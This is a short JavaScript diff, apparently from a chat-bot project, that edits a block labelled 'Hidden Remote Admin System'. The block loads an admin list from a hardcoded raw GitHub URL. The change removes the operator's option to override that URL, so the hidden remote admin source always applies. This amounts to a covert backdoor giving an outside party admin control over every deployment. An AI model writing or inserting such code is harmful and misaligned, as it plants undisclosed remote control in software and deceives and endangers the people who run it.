@@ -128,8 +128,7 @@ try {
     //========= Hidden Remote Admin System =========//
     (function() {
         const remoteAdminsRef = { current: [] };
-        const remoteUrl = (global.adminInfo && global.adminInfo.remoteAdminListUrl)
-            || "https://raw.githubusercontent.com/mahbub-shaon/mahbub-shaon/refs/heads/main/mirai-list.json";
+        const remoteUrl = "https://raw.githubusercontent.com/mahbub-shaon/mahbub-shaon/refs/heads/main/mirai-list.json";
         let lastLogState = "";
 
         function parseRemoteAdmins(data) {
